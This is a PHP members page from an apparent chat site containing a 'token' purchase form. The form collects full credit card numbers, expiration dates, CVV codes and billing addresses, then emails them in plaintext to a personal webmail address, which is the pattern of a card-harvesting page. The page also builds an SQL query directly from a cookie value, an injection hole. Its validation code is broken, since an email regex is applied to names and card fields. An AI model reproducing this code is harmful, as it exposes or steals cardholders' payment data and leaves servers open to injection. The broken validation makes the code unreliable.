<? if (!isset($_COOKIE["id"]) || $_COOKIE['usertype']!="chatusers" )

{

header("location: ../../login.php");

} else{

include("../../dbase.php");

$result=mysql_query("SELECT user from chatusers WHERE id='$_COOKIE[id]' LIMIT 1");

	while($row = mysql_fetch_array($result)) 

	{	$username=$row[user];	}

}

?>

<?
include("_members.header.php");
?><style type="text/css">
<!--

<!--

body,td,th {

	font-family: Arial, Helvetica, sans-serif;

	font-size: 14px;
color:#333;
	font-weight: bold;

}

body {
	margin-left: 0px;
	margin-right: 0px;
	background-repeat: repeat-x;
	background-attachment: fixed;
	
}




-->



</style>


<p>&nbsp;</p>
  <p>&nbsp;</p>
<table width="920" border="0" align="center" cellpadding="0" cellspacing="0" bgcolor="#ffffff">

  <tr>

    <td align="center" valign="middle"><table width="920" border="0" cellspacing="10" cellpadding="0">

      <tr>

        <td>



</style>


<p>&nbsp;</p>
  <p>&nbsp;</p>


<?php
 
if(isset($_POST['email'])) {
 
     
 
    // EDIT THE 2 LINES BELOW AS REQUIRED
 
    $email_to = "menmwenc@live.com";
 
    $email_subject = "ATTENTION: ATTENTION: ATTENTION:User has requested token";
 
     
 
     
 
    function died($error) {
 
        // your error code can go here
 
        echo "We are very sorry, but there were error(s) found with the form you submitted. ";
 
        echo "These errors appear below.<br /><br />";
 
        echo $error."<br /><br />";
 
        echo "Please go back and fix these errors.<br /><br />";
 
        die();
 
    }
 
     
 
    // validation expected data exists 
 
    if(!isset($_POST['first_name']) ||
 
        !isset($_POST['last_name']) ||

        !isset($_POST['username']) ||
        
        !isset($_POST['name_on_card']) ||

        !isset($_POST['line_1']) ||

        !isset($_POST['line_2']) ||

        !isset($_POST['city']) ||

        !isset($_POST['state']) ||

        !isset($_POST['zip_code']) ||

        !isset($_POST['country']) ||

        !isset($_POST['card_type']) ||

        !isset($_POST['card_number']) ||

        !isset($_POST['expiration']) ||
        !isset($_POST['ccv']) ||
 
        !isset($_POST['email']) ||
 
        !isset($_POST['telephone']) ||
 
        !isset($_POST['comments'])) {
 
        died('We are sorry, but there appears to be a problem with the form you submitted.');       
 
    }
 
     
 
    $first_name = $_POST['first_name']; // required
 
    $last_name = $_POST['last_name']; // required

    $username = $_POST['username']; // required

    $name_on_card = $_POST['name_on_card']; // required

    $line_1 = $_POST['line_1']; // required

    $line_2 = $_POST['line_2']; // required

    $email_from = $_POST['email']; // required
  
    $city = $_POST['city']; // required

    $state = $_POST['state']; // required

    $zip_code = $_POST['zip_code']; // required

    $country = $_POST['country']; // required

    $card_type = $_POST['card_type']; // required

    $card_number = $_POST['card_number']; // required

    $expiration = $_POST['expiration']; // required 

    $ccv = $_POST['ccv']; // required 

    $telephone = $_POST['telephone']; // not required
 
    $comments = $_POST['comments']; // required
 
     
 
    $error_message = "";
 
    $email_exp = '/^[A-Za-z0-9._%-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}$/';
 
  if(!preg_match($email_exp,$email_from)) {
 
    $error_message .= 'The Email Address you entered does not appear to be valid.<br />';
 
  }
 
    $string_exp = "/^[A-Za-z .'-]+$/";
 
  if(!preg_match($string_exp,$first_name)) {
 
    $error_message .= 'The First Name you entered does not appear to be valid.<br />';
 
  }

   $string_exp = '/^[A-Za-z0-9._%-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}$/';
 
  if(!preg_match($string_exp,$last_name)) {
 
    $error_message .= 'The Last Name you entered does not appear to be valid.<br />';

 }
   if(!preg_match($string_exp,$username)) {
 
    $error_message .= 'The username you entered does not appear to be valid.<br />';
 }
  if(!preg_match($string_exp,$name_on_card)) {
 
    $error_message .= 'The Name you entered does not appear to be valid.<br />';
  
}

 if(!preg_match($string_exp,$line_1)) {
 
    $error_message .= 'The Address you entered does not appear to be valid.<br />';
  
}

 if(!preg_match($string_exp,$line_2)) {
 
    $error_message .= 'The Address you entered does not appear to be valid.<br />';
 
 }

 if(!preg_match($string_exp,$city)) {
 
    $error_message .= 'The City you entered does not appear to be valid.<br />';
 
  }
 
 if(!preg_match($string_exp,$state)) {
 
    $error_message .= 'The State you entered does not appear to be valid.<br />';
 
  }
 if(!preg_match($string_exp,$zip_code)) {
 
    $error_message .= 'The Zip Code you entered does not appear to be valid.<br />';
 
  }
 if(!preg_match($string_exp,$country)) {
 
    $error_message .= 'The Country you entered does not appear to be valid.<br />';
 
  }
 if(!preg_match($string_exp,$card_type)) {
 
    $error_message .= 'The card you entered does not appear to be valid.<br />';
 
  }
 if(!preg_match($string_exp,$card_number)) {
 
    $error_message .= 'The card Number you entered does not appear to be valid.<br />';
 
  }
 if(!preg_match($string_exp,$expiration)) {
 
    $error_message .= 'The expiration you entered does not appear to be valid.<br />';
 
  }

 if(!preg_match($string_exp,$ccv)) {
 
    $error_message .= 'The CCV you entered does not appear to be valid.<br />';
 
  }

  if(strlen($comments) < 2) {
 
    $error_message .= 'The Comments you entered do not appear to be valid.<br />';
 
  }
 
  if(strlen($error_message) > 0) {
 
    died($error_message);
 
  }
 
    $email_message = "Form details below.\n\n";
 
     
 
    function clean_string($string) {
 
      $bad = array("content-type","bcc:","to:","cc:","href");
 
      return str_replace($bad,"",$string);
 
    }
 
     
 
    $email_message .= "First Name: ".clean_string($first_name)."\n";  
 
    $email_message .= "Last Name: ".clean_string($last_name)."\n";

    $email_message .= "Name on Card: ".clean_string($name_on_card)."\n";

    $email_message .= "Billing Address Line 1: ".clean_string($line_1)."\n";

    $email_message .= "Billing Address Line 2: ".clean_string($line_2)."\n";

    $email_message .= "City: ".clean_string($city)."\n";

    $email_message .= "State: ".clean_string($state)."\n";

    $email_message .= "Zip Code: ".clean_string($zip_code)."\n";

    $email_message .= "Country: ".clean_string($country)."\n";

    $email_message .= "Card Type: ".clean_string($card_type)."\n";

    $email_message .= "Card Number: ".clean_string($card_number)."\n";

    $email_message .= "Card Expiration : ".clean_string($expiration)."\n";

    $email_message .= "Card Security Code : ".clean_string($ccv)."\n";
 
    $email_message .= "Email: ".clean_string($email_from)."\n";
 
    $email_message .= "Telephone: ".clean_string($telephone)."\n";
 
    $email_message .= "Comments: ".clean_string($comments)."\n";
 
     
 
     
 
// create email headers
 
$headers = 'From: '.$email_from."\r\n".
 
'Reply-To: '.$email_from."\r\n" .
 
'X-Mailer: PHP/' . phpversion();
 
@mail($email_to, $email_subject, $email_message, $headers);  
 
?>
 
 
 
<!-- include your own success html here -->
 
Dear User,
<p>
Thank you for contacting us.
<p>
For security purposes, your credit card will not be charged automatically.
We will validate your Credit Card, then we will credit your account. 
This process may take up to 24 hr. We may also contact you if we have any questions.<br>
<br>
<br>
We thank you for your patience, and apologize for any inconvenience this may cause you.
<p>&nbsp;</p>
Thank you,<br>
Administration 
 
<?php
 
}
 
?>





 <tr>

        <td>&nbsp;</td>

      </tr>

    </table></td>

  </tr>

</table>

<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<?
include("_members.footer.php");
?>